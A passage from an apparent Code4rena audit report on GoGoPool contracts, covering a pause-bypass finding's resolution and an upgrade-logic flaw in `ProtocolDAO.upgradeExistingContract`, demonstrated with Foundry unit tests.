class=\"grvsc-source\">}</span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>We suggest to use <code>WhenNotPaused</code> modifier.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/823\">emersoncloud (GoGoPool) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/823#issuecomment-1415693372\">Alex the Entreprenerd (judge) commented</a>:</strong></p>\n<blockquote>\n<p>The Warden has shown an inconsistency as to how Pausing is used.</p>\n<p>While other aspects of the code are pausable and under the control of the <code>guardian</code>, a call to <code>startRewardsCycle</code> can be performed by anyone, and in the case of a system-wide pause may create unfair gains or lost rewards.</p>\n<p>For this reason I agree with Medium Severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest#mitigations-to-be-reviewed\">emersoncloud (GoGoPool) mitigated</a>:</strong></p>\n<blockquote>\n<p>Pause startRewardsCycle when protocol is paused: <a href=\"https://github.com/multisig-labs/gogopool/pull/22\">multisig-labs/gogopool#22</a></p>\n</blockquote>\n<p><strong>Status:</strong> Mitigation confirmed with comments. Full details in <a href=\"https://github.com/code-423n4/2023-02-gogopool-mitigation-contest-findings/issues/12\">report from RaymondFam</a>.</p>\n<hr>\n<h2 id=\"m-02-coding-logic-of-the-contract-upgrading-renders-upgrading-contracts-impractical\" style=\"position:relative;\"><a href=\"#m-02-coding-logic-of-the-contract-upgrading-renders-upgrading-contracts-impractical\" aria-label=\"m 02 coding logic of the contract upgrading renders upgrading contracts impractical permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742\">[M-02] Coding logic of the contract upgrading renders upgrading contracts impractical</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/742\">gz627</a>, also found by <a href=\"undefined\">Allarious</a>, <a href=\"undefined\">ast3ros</a>, <a href=\"undefined\">bin2chen</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/850\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/782\">hihen</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/755\">adriro</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/747\">unforgiven</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/746\">Czar102</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/729\">nogo</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/724\">nogo</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/706\">imare</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/698\">HE1M</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/621\">KmanOfficial</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/558\">neumo</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/542\">AkshaySrivastav</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/479\">betweenETHlines</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/465\">peanuts</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/358\">mookimgo</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/335\">cccz</a>, <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/315\">chaduke</a>, and <a href=\"https://github.com/code-423n4/2022-12-gogopool-findings/issues/275\">HollaDieWaldfee</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol#L209-L216\">Link to original code</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: https:</span><span class=\"mtk3\">//github.com/code-423n4/2022-12-gogopool/blob/main/contracts/contract/ProtocolDAO.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">205</span><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @notice Upgrade a contract by unregistering the existing address, and registring a new address and name</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param newAddr Address of the new contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param newName Name of the new contract</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk3\">/// @param existingAddr Address of the existing contract to be deleted</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">209</span><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">upgradeExistingContract</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newAddr</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newName</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingAddr</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t) </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyGuardian</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">registerContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">newName</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t\t</span><span class=\"mtk11\">unregisterContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">216</span><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p>Function <code>ProtocolDAO.upgradeExistingContract</code> handles contract upgrading. However, there are multiple implicaitons of the coding logic in the function, which render the contract upgrading impractical.</p>\n<p><strong>Implication 1</strong>:</p>\n<p>The above function <code>upgradeExistingContract</code> registers the upgraded contract first, then unregisters the existing contract. This leads to the requirement that the upgraded contract name <strong>must be different from</strong> the existing contract name. Otherwise the updated contract address returned by <code>Storage.getAddress(keccak256(abi.encodePacked(\"contract.address\", contractName)))</code> will be <code>address(0)</code> (please refer to the below POC Testcase 1). This is because if the upgraded contract uses the original name (i.e. the contract name is not changed), function call  <code>unregisterContract(existingAddr)</code> in the <code>upgradeExistingContract</code> will override the registered contract address in <code>Storage</code> to address(0) due to the use of the same contract name.</p>\n<p>Since using the same name after upgrading will run into trouble with current coding logic, a safeguard should be in place to make sure two names are really different. For example, put this statement in the <code>upgradeExistingContract</code> function:<br>\n<code>require(newName != existingName, \"Name not changed\");</code>, where <code>existingName</code> can be obtained using:<br>\n<code>string memory existingName = store.getString(keccak256(abi.encodePacked(\"contract.name\", existingAddr)));</code>.</p>\n<p><strong>Implication 2</strong>:</p>\n<p>If we really want a different name for an upgraded contract, we then get into more serious troubles: We have to upgrade other contracts that reference the upgraded contract since contract names are referenced mostly hardcoded (for security considerations). This may lead to a very complicated issue because contracts are cross-referenced.</p>\n<p>For example, contract <code>ClaimNodeOp</code> references contracts <code>RewardsPool</code>, <code>ProtocolDAO</code> and <code>Staking</code>. At the same time, contract <code>ClaimNodeOp</code> is referenced by contracts <code>RewardsPool</code> and <code>Staking</code>. This means that:</p>\n<ol>\n<li>If contract <code>ClaimNodeOp</code> was upgraded, which means the contract name <code>ClaimNodeOp</code> was changed;</li>\n<li>This requires contracts <code>RewardsPool</code> and <code>Staking</code> to be upgraded (with new names) in order to correctly reference to newly named <code>ClaimNodeOp</code> contract;</li>\n<li>This further requires those contracts that reference <code>RewardsPool</code> or <code>Staking</code> to be upgraded in order to correctly reference them;</li>\n<li>and this further requires those contracts that reference the above upgraded contracts to be upgraded …</li>\n<li>This may lead to complicated code management issue and expose new vulnerabilites due to possible incomplete code adaptation.</li>\n<li>This may render the contracts upgrading impractical.</li>\n</ol>\n<p>I rate this issue as high severity due to the fact that:<br>\nContract upgradability is one of the main features of the whole system design (all other contracts are designed upgradable except for <code>TokenGGP</code>, <code>Storage</code> and <code>Vault</code> ). However, the current <code>upgradeExistingContract</code> function’s coding logic requires the upgraded contract must change its name (refer to the below Testcase 1). This inturn requires to upgrade all relevant cross-referenced contracts (refer to the below Testcase 2). Thus leading to a quite serous code management issue while upgrading contracts, and renders upgrading contracts impractical.</p>\n<h3 id=\"proof-of-concept-7\" style=\"position:relative;\"><a href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><strong>Testcase 1</strong>:</p>\n<p>This testcase demonstrates that current coding logic of upgrading contracts requires: <strong>the upgraded contract must change its name</strong>. Otherwise contract upgrading will run into issue.\nPut the below test case in file <code>ProtocolDAO.t.sol</code>. The test case demonstrates that <code>ProtocolDAO.upgradeExistingContract</code> does not function properly if the upgraded contract does not change the name. That is: the upgraded contract address returned by <code>Storage.getAddress(keccak256(abi.encodePacked(\"contract.address\", contractName)))</code> will be <code>address(0)</code> if its name unchanged.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">testUpgradeExistingContractWithNameUnchanged</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">addr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">randAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">name</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;existingName&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">randAddress</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">string</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\"> = </span><span class=\"mtk8\">&quot;existingName&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">registerContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">guardian</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit upgrade contract while name unchanged</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">dao</span><span class=\"mtk1\">.</span><span class=\"mtk11\">upgradeExistingContract</span><span class=\"mtk1\">(</span><span class=\"mtk12\">addr</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">true</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk3\">//@audit the registered address was deleted by function call `PtotocolDAO.unregisterContract(existingAddr)`</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">name</span><span class=\"mtk1\">))), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">addr</span><span class=\"mtk1\">))), </span><span class=\"mtk12\">name</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">               </span><span class=\"mtk3\">//@audit verify that the old contract has been de-registered</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.exists&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk4\">false</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingName</span><span class=\"mtk1\">))), </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk11\">assertEq</span><span class=\"mtk1\">(</span><span class=\"mtk12\">store</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getString</span><span class=\"mtk1\">(</span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.name&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">existingAddr</span><span class=\"mtk1\">))), </span><span class=\"mtk8\">&quot;&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t}</span></span></span></code></pre>\n<p><strong>Testcase 2</strong>:</p>\n<p>This testcase demonstrates that current coding logic of upgrading contracts requires: <strong>in order to upgrade a single contract, all cross-referenced contracts have to be upgraded and change their names</strong>. Otherwise, other contracts will run into issues.<br>\nIf the upgraded contract does change its name, contract upgrading will succeed. However, other contracts’ functions that reference the upgraded contract will fail due to referencing hardcoded contract name.<br>\nThe below testcase upgrades contract <code>ClaimNodeOp</code> to <code>ClaimNodeOpV2</code>. Then, contract <code>Staking</code> calls <code>increaseGGPRewards</code> which references hardcoded contract name <code>ClaimNodeOp</code> in its modifier. The call is failed.</p>\n<p>Test steps:</p>\n<ol>\n<li>Copy contract file <code>ClaimNodeOp.sol</code> to <code>ClaimNodeOpV2.sol</code>, and rename the contract name from <code>ClaimNodeOp</code> to <code>ClaimNodeOpV2</code> in file  <code>ClaimNodeOpV2.sol</code>;</li>\n<li>Put the below test file <code>UpgradeContractIssue.t.sol</code> under folder <code>test/unit/</code>;</li>\n<li>Run the test.</li>\n</ol>\n<p><strong>Note</strong>: In order to test actual function call after upgrading contract, this testcase upgrades a real contract <code>ClaimNodeOp</code>. This is different from the above Testcase 1 which uses a random address to simulate a contract.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// File: UpgradeContractIssue.t.sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// SPDX-License-Identifier: GPL-3.0-only</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">pragma</span><span class=\"mtk1\"> </span><span class=\"mtk12\">solidity</span><span class=\"mtk1\"> </span><span class=\"mtk7\">0.8</span><span class=\"mtk1\">.</span><span class=\"mtk7\">17</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;./utils/BaseTest.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">ClaimNodeOpV2</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/contract/ClaimNodeOpV2.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">import</span><span class=\"mtk1\"> {</span><span class=\"mtk12\">BaseAbstract</span><span class=\"mtk1\">} </span><span class=\"mtk15\">from</span><span class=\"mtk1\"> </span><span class=\"mtk8\">&quot;../../contracts/contract/BaseAbstract.sol&quot;</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">UpgradeContractIssueTest</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">BaseTest</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">using</span><span class=\"mtk1\"> </span><span class=\"mtk12\">FixedPointMathLib</span><span class=\"mtk1\"> </span><span class=\"mtk12\">for</span><span class=\"mtk1\"> </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">private</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk12\">constant</span><span class=\"mtk1\"> </span><span class=\"mtk12\">TOTAL_INITIAL_GGP_SUPPLY</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">22_500_000</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t</span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk4\">super</span><span class=\"mtk1\">.</span><span class=\"mtk11\">setUp</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">getActorWithTokens</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;nodeOp1&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">, </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">prank</span><span class=\"mtk1\">(</span><span class=\"mtk12\">nodeOp1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span class=\"mtk12\">ggp</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">staking</span><span class=\"mtk1\">), </span><span class=\"mtk12\">MAX_AMT</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">\t\t</span><span 